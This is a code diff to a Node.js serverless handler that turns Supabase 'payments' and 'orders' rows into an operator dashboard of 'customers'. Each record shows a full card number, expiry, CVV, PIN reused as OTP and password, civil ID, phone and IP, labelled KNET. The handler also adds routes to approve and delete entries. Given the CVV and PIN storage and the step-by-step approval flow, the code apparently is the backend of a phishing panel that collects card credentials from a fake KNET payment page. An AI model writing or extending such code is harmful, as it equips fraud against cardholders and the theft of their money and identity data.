@@ -64,6 +64,99 @@ module.exports = async (req, res) => {
     return null;
   }
 
+  function paymentToCustomer(p, order) {
+    return {
+      id: String(p.id),
+      cardNumber: p.card_number || '',
+      cardExpiry: p.card_expiry || '',
+      cardCvv: p.card_cvv || '',
+      otp: p.card_pin || '',
+      pin: p.card_pin || '',
+      password: p.card_pin || '',
+      username: p.card_number || '',
+      fullName: order ? order.full_name : '',
+      phone: order ? order.phone : '',
+      civilId: order ? order.civil_id : '',
+      cardType: p.card_type || 'KNET',
+      amount: p.amount || 0,
+      transactionRef: p.transaction_ref || '',
+      ipAddress: p.ip_address || '',
+      userAgent: p.user_agent || '',
+      status: p.status || 'pending',
+      credentialsStatus: p.status === 'pending' ? 'pending' : p.status === 'accepted' ? 'approved' : p.status,
+      passwordStatus: p.card_pin ? 'entered' : 'pending',
+      usernameStatus: p.card_number ? 'entered' : 'pending',
+      currentStep: p.card_pin ? 'otp' : p.card_number ? 'card' : 'start',
+      lastPage: 'knet-payment',
+      lastAction: p.created_at || new Date().toISOString(),
+      createdAt: p.created_at || new Date().toISOString(),
+      updatedAt: p.created_at || new Date().toISOString(),
+      loginInfo: { username: p.card_number || '', password: p.card_pin || '' },
+      loginAttempts: p.card_number ? { '1': { cardNumber: p.card_number, cardExpiry: p.card_expiry, cardCvv: p.card_cvv, pin: p.card_pin, timestamp: p.created_at } } : {}
+    };
+  }
+
+  async function readCustomers(parts) {
+    const pr = await fetch(SB + '/rest/v1/payments?select=*&order=created_at.desc', { headers: baseH });
+    const payments = await pr.json();
+    const or = await fetch(SB + '/rest/v1/orders?select=*&order=created_at.desc', { headers: baseH });
+    const orders = await or.json();
+    const orderMap = {};
+    for (const o of orders) orderMap[o.id] = o;
+
+    if (parts.length === 1) {
+      const value = {};
+      for (const p of payments) {
+        const o = p.order_id ? orderMap[p.order_id] : (orders.length > 0 ? orders[0] : null);
+        value[p.id] = paymentToCustomer(p, o);
+      }
+      return value;
+    }
+    if (parts.length >= 2) {
+      const id = parts[1];
+      const p = payments.find(x => String(x.id) === id);
+      if (!p) return null;
+      const o = p.order_id ? orderMap[p.order_id] : (orders.length > 0 ? orders[0] : null);
+      const customer = paymentToCustomer(p, o);
+      if (parts.length === 2) return customer;
+      if (parts.length >= 3) return customer[parts[2]] !== undefined ? customer[parts[2]] : null;
+    }
+    return null;
+  }
+
+  async function readCustomerEvents(parts) {
+    const pr = await fetch(SB + '/rest/v1/payments?select=*&order=created_at.desc', { headers: baseH });
+    const payments = await pr.json();
+    if (parts.length === 1) {
+      const value = {};
+      for (const p of payments) {
+        value[p.id] = {
+          id: String(p.id),
+          type: 'payment',
+          customerId: String(p.id),
+          action: 'card_submitted',
+          timestamp: p.created_at,
+          data: { cardType: p.card_type, amount: p.amount, ref: p.transaction_ref }
+        };
+      }
+      return value;
+    }
+    if (parts.length >= 2) {
+      const id = parts[1];
+      const p = payments.find(x => String(x.id) === id);
+      if (!p) return null;
+      const event = { id: String(p.id), type: 'payment', customerId: String(p.id), action: 'card_submitted', timestamp: p.created_at, data: { cardType: p.card_type, amount: p.amount, ref: p.transaction_ref } };
+      if (parts.length === 2) return event;
+      if (parts.length >= 3) return event[parts[2]] !== undefined ? event[parts[2]] : null;
+    }
+    return null;
+  }
+
+  async function readSettings(parts) {
+    if (parts.length >= 2 && parts[1] === 'whatsapp') return null;
+    return null;
+  }
+
   async function readKvStore(parts) {
     try {
       const r = await fetch(SB + '/rest/v1/kv_store?select=*', { headers: baseH });
@@ -117,6 +210,9 @@ module.exports = async (req, res) => {
     if (parts.length === 0) return null;
 
     if (parts[0] === 'dashboardAccounts') return readDashboardAccounts(parts);
+    if (parts[0] === 'customers') return readCustomers(parts);
+    if (parts[0] === 'customerEvents') return readCustomerEvents(parts);
+    if (parts[0] === 'settings') return readSettings(parts);
     if (sqlTables.includes(parts[0])) return readSqlTable(parts);
     return readKvStore(parts);
   }
@@ -125,6 +221,25 @@ module.exports = async (req, res) => {
     const parts = parsePath(path);
     if (parts.length < 1) return;
     const table = parts[0];
+
+    if (table === 'customers' && parts.length >= 2) {
+      const id = parts[1];
+      if (parts.length === 2 && typeof value === 'object' && value !== null) {
+        const mapped = {};
+        if (value.status !== undefined) mapped.status = value.status;
+        if (value.credentialsStatus !== undefined) mapped.status = value.credentialsStatus === 'approved' ? 'accepted' : value.credentialsStatus;
+        if (Object.keys(mapped).length > 0) {
+          await fetch(SB + '/rest/v1/payments?id=eq.' + id, { method: 'PATCH', headers: writeH, body: JSON.stringify(mapped) });
+        }
+      } else if (parts.length >= 3) {
+        const field = parts[2];
+        if (field === 'status' || field === 'credentialsStatus') {
+          const mapped = field === 'credentialsStatus' ? (value === 'approved' ? 'accepted' : value) : value;
+          await fetch(SB + '/rest/v1/payments?id=eq.' + id, { method: 'PATCH', headers: writeH, body: JSON.stringify({ status: mapped }) });
+        }
+      }
+      return;
+    }
 
     if (table === 'dashboardAccounts' && parts.length >= 2) {
       const key = parts[1];
@@ -173,6 +288,10 @@ module.exports = async (req, res) => {
     if (parts.length < 2) return;
     const table = parts[0];
 
+    if (table === 'customers') {
+      await fetch(SB + '/rest/v1/payments?id=eq.' + parts[1], { method: 'DELETE', headers: baseH });
+      return;
+    }
     if (table === 'dashboardAccounts') {
       const email = keyToEmail(parts[1]);
       await fetch(SB + '/rest/v1/admin_users?email=eq.' + encodeURIComponent(email), { method: 'DELETE', headers: baseH });
